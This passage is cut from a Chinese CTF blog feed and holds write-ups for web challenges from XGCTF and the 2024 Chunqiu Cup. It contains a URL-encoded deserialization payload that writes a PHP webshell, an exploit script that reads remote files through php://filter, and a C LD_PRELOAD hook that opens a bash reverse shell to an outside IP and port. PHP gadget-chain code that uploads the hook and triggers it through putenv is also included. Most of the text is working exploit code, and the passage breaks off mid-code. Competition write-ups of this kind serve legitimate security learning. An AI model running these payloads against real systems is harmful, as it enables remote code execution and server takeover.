number">2</span>FJ22XfupcE77v<span class="token operator">%</span><span class="token number">2</span>F7Pr8706OW4T0JkQ5X33kZbpvmW361YG2kW43OAj5JGoV2LhKz<span class="token operator">%</span><span class="token number">2</span>Ba3v3m3fvpoNKjcgA<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">&amp;</span>read<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121700296.png" alt="image-20240707121700296"></p><p>成功写入shell.php，接下来用同样的方式写马即可（注意反斜杠转义<code>$</code>）</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125336463.png" alt="image-20240707125336463"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125857528.png" alt="image-20240707125857528"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125509231.png" alt="image-20240707125509231"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125456189.png" alt="image-20240707125456189"></p><p>官方的exp，处理字符串逃逸的部分写得比我好（</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.    """</span>    payload_file <span class="token operator">=</span> <span class="token string">'O:9:"read_file":2:&#123;s:5:"start";s:9:"gxngxngxn";s:8:"filename";s:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">':"'</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">'";&#125;'</span>    payload <span class="token operator">=</span> <span class="token string">"%9f"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload_file<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"%2b"</span><span class="token punctuation">)</span>    filename_len <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> self<span class="token punctuation">.</span>url<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"?start=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename_len<span class="token punctuation">&#125;</span></span><span class="token string">&amp;read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns the contents of a remote file.    """</span>    path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"What you are reading is:(.*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="NewerFileDetector（Unsolved）"><a href="#NewerFileDetector（Unsolved）" class="headerlink" title="NewerFileDetector（Unsolved）"></a>NewerFileDetector（Unsolved）</h2><blockquote><p>xss</p></blockquote><hr><h2 id="SendMessage（Unsolved）"><a href="#SendMessage（Unsolved）" class="headerlink" title="SendMessage（Unsolved）"></a>SendMessage（Unsolved）</h2><p>php在处理共享内存跨进程通讯时，如果内存里面的内容可控，会直接触发反序列化操作</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;web和pwn最分不开的一集&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1&quot;&gt;https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;草，一个最新最热cve分别出了一个web题和一个pwn题&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>2024春秋杯网络安全联赛夏季赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/</id>
    <published>2024-07-05T15:22:54.000Z</published>
    <updated>2024-07-07T15:42:58.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>个人名称：雲流</p><p>个人排名：68</p><p>签到题都做不来有点难绷</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\('</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\)'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No injecting!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span>=<span class="token interpolation"><span class="token variable">$value</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat hints.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"YesYes"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"YesYesYes"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You are stupid, what exactly is your identity?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker"</span><span class="token operator">==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">enviroment</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker is bad guy!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$function_name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.[^.]*$/'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$uploadDir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token punctuation">;</span>            <span class="token variable">$destination</span> <span class="token operator">=</span> <span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$destination</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件成功移动到$&#123;destination&#125;"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'文件移动失败。'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"非法文件名。"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Harder'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼ld_preload</p><p>稍微审计一下，给了上传文件的地方，那么我们要做的就是劫持<code>cat</code>命令</p><p>上传文件的链子：<code>ENV::__wakeup -&gt; DIFF::__isset -&gt; FUN::__get -&gt; FILE::__call</code></p><p>准备一下so文件</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240705235511829.png" alt="image-20240705235511829"></p><p>劫持strncmp即可</p><p>hook_strncmp.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">,</span> <span class="token class-name">size_t</span> __n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 这里函数的定义可以根据报错信息进行确定</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译so文件并用base64输出</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> hook_strncmp.c <span class="token parameter variable">-o</span> hook_strncmp.so base64 hook_strncmp.so <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span> <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"1.so"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DIFF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FUN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FILE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706000251607.png" alt="image-20240706000251607"></p><p>得到文件路径：<code>/tmp/29f91f211e3f3f46e167f664c28f6136.so</code></p><p>接下来触发<code>ENV::__toString</code>，用字符串与对象的弱比较触发</p><p>链子：<code>ENV::__wakeup -&gt; DIFF::__isset -&gt; FILE::__get -&gt; ENV::__toString</code></p><p>（so文件不一样是因为我个fw做超时了x）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"LD_PRELOAD"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token string double-quoted-string">"/tmp/1ce494339fd8f830fd8318acb4782917.so"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DIFF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FILE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">enviroment</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token 